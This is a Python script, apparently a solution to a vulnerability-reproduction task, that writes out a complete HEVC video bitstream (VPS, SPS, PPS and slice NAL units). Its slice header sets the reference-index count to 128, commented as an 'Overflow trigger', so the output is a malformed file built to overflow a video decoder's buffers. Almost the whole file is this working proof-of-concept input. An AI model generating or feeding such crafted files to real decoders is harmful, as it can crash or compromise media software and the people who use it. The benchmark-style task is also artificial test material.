import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        class BitStream:
            def __init__(self):
                self.stream = bytearray()
                self.byte_buffer = 0
                self.bit_len = 0

            def write_bit(self, b):
                self.byte_buffer = (self.byte_buffer << 1) | (b & 1)
                self.bit_len += 1
                if self.bit_len == 8:
                    self.stream.append(self.byte_buffer)
                    self.byte_buffer = 0
                    self.bit_len = 0

            def write_bits(self, val, n):
                for i in range(n-1, -1, -1):
                    self.write_bit((val >> i) & 1)

            def write_ue(self, val):
                if val == 0:
                    self.write_bit(1)
                else:
                    tmp = val + 1
                    length = tmp.bit_length()
                    for _ in range(length - 1):
                        self.write_bit(0)
                    self.write_bits(tmp, length)

            def write_se(self, val):
                if val <= 0:
                    self.write_ue((-val) * 2)
                else:
                    self.write_ue(val * 2 - 1)

            def write_byte_align(self):
                if self.bit_len > 0:
                    self.write_bit(1)
                    while self.bit_len > 0:
                        self.write_bit(0)

            def get_bytes(self):
                self.write_byte_align()
                return bytes(self.stream)

        def add_emulation_prev(data):
            out = bytearray()
            zeros = 0
            for b in data:
                if zeros == 2 and b <= 3:
                    out.append(3)
                    zeros = 0
                out.append(b)
                if b == 0:
                    zeros += 1
                else:
                    zeros = 0
            return bytes(out)

        def write_ptl(bs):
            bs.write_bits(0, 2) 
            bs.write_bit(0)     
            bs.write_bits(1, 5) 
            bs.write_bits(0xffffffff, 32) 
            bs.write_bit(1) 
            bs.write_bit(1) 
            bs.write_bit(0) 
            bs.write_bit(0) 
            bs.write_bits(0, 44) 
            bs.write_bits(30, 8) 

        # VPS
        vps = BitStream()
        vps.write_bits(0, 4)
        vps.write_bits(3, 2)
        vps.write_bits(0, 6)
        vps.write_bits(0, 3)
        vps.write_bit(1)
        vps.write_bits(0xffff, 16)
        write_ptl(vps)
        vps.write_bit(1)
        vps.write_ue(0)
        vps.write_ue(0)
        vps.write_ue(0)
        vps.write_bits(0, 6)
        vps.write_ue(0)
        vps.write_bit(0)
        vps.write_bit(0)

        # SPS
        sps = BitStream()
        sps.write_bits(0, 4)
        sps.write_bits(0, 3)
        sps.write_bit(1)
        write_ptl(sps)
        sps.write_ue(0)
        sps.write_ue(1)
        sps.write_ue(64)
        sps.write_ue(64)
        sps.write_bit(0)
        sps.write_ue(0)
        sps.write_ue(0)
        sps.write_ue(4)
        sps.write_bit(1)
        sps.write_ue(0)
        sps.write_ue(0)
        sps.write_ue(0)
        sps.write_ue(0)
        sps.write_ue(0)
        sps.write_ue(0)
        sps.write_ue(0)
        sps.write_ue(0)
        sps.write_ue(0)
        sps.write_bit(0)
        sps.write_bit(0)
        sps.write_bit(0)
        sps.write_bit(0)
        sps.write_ue(0)
        sps.write_bit(0)
        sps.write_bit(0)
        sps.write_bit(0)
        sps.write_bit(0)
        sps.write_bit(0)

        # PPS
        pps = BitStream()
        pps.write_ue(0)
        pps.write_ue(0)
        pps.write_bit(0)
        pps.write_bit(0)
        pps.write_bits(0, 3)
        pps.write_bit(0)
        pps.write_bit(0)
        pps.write_ue(0)
        pps.write_ue(0)
        pps.write_se(0)
        pps.write_bit(0)
        pps.write_bit(0)
        pps.write_bit(0)
        pps.write_bit(0)
        pps.write_bit(0)
        pps.write_bit(0)
        pps.write_bit(0)
        pps.write_bit(0)
        pps.write_bit(0)
        pps.write_bit(0)
        pps.write_bit(0)
        pps.write_bit(0)
        pps.write_bit(0)
        pps.write_ue(0)
        pps.write_bit(0)
        pps.write_bit(0)

        # Slice
        sl = BitStream()
        sl.write_bit(1) # first_slice
        sl.write_ue(0) # pps_id
        sl.write_ue(1) # slice_type P
        sl.write_bits(0, 8) # pic_order_cnt_lsb
        sl.write_bit(0) # short_term_ref_pic_set_sps_flag
        sl.write_ue(0) # num_neg
        sl.write_ue(0) # num_pos
        sl.write_bit(1) # num_ref_idx_active_override
        sl.write_ue(128) # num_ref_idx_l0_active_minus1 (Overflow trigger)
        sl.write_ue(0)
        
        final = bytearray()
        final.extend(b'\x00\x00\x00\x01\x40\x01')
        final.extend(add_emulation_prev(vps.get_bytes()))
        final.extend(b'\x00\x00\x00\x01\x42\x01')
        final.extend(add_emulation_prev(sps.get_bytes()))
        final.extend(b'\x00\x00\x00\x01\x44\x01')
        final.extend(add_emulation_prev(pps.get_bytes()))
        final.extend(b'\x00\x00\x00\x01\x02\x01')
        final.extend(add_emulation_prev(sl.get_bytes()))

        return bytes(final)
